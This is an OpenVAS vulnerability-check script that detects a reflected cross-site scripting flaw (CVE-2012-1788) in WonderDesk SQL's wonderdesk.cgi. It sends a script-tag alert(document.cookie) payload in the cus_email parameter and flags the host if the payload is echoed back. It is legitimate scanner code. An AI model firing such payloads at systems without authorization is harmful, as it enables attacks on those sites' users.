###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wonderdesk_mult_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Wonderdesk SQL Multiple Cross-Site Scripting (XSS) Vulnerabilities
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a users browser session in context of an affected site and
  launch other attacks.
  Impact Level: Application";

tag_affected = "Wonderdesk version 4.14, other versions may also be affected";
tag_insight = "Multiple flaws due to,
  - Improper sanitization of 'cus_email' parameter to wonderdesk.cgi when 'do'
    is set to 'cust_lostpw'.
  - Improper sanitization of 'help_name', 'help_email', 'help_website', and
    'help_example_url' parameters to wonderdesk.cgi when 'do' is set to
    'hd_modify_record'.";
tag_solution = "No solution or patch is available as of 3rd June, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.wonderdesk.com";
tag_summary = "The host is installed with Wonderdesk SQL and is prone to multiple
  cross-site scripting vulnerabilities.";

if(description)
{
  script_id(803625);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2012-1788");
  script_bugtraq_id(52193);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-03 15:30:38 +0530 (Mon, 03 Jun 2013)");
  script_name("Wonderdesk SQL Multiple Cross-Site Scripting (XSS) Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/79647");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48167");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/73502");
  script_xref(name : "URL" , value : "http://st2tea.blogspot.in/2012/02/wonderdesk-cross-site-scripting.html");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/110224/WonderDesk-Cross-Site-Scripting.html");
  script_summary("Check if Wonderdesk SQL is vulnarable to cross-site scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port =0;
req = "";
res = "";
dir = "";
sndReq = "";
rcvRes = "";
postdata = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("", "/wonderdesk", "/helpdesk", cgi_dirs()))
{
  ## Send and Recieve the response
  sndReq = http_get(item:string(dir, "/wonderdesk.cgi"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  if(rcvRes && ('>Help Desk' >< rcvRes && "WonderDesk SQL" >< rcvRes ))
  {
    ## Construct the POST data
    postdata = "do=cust_lostpw&cus_email=%22%3Cscript%3Ealert%28" +
               "document.cookie%29%3C%2Fscript%3E&Submit=Submit";

    req = string("POST ", dir, "/wonderdesk.cgi HTTP/1.1\r\n",
                 "Host: ", get_host_name(), "\r\n",
                 "User-Agent: XSS Test\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res && "<script>alert(document.cookie)</script>" >< res)
    {
      security_warning(port);
      exit(0);
    }
  }
}
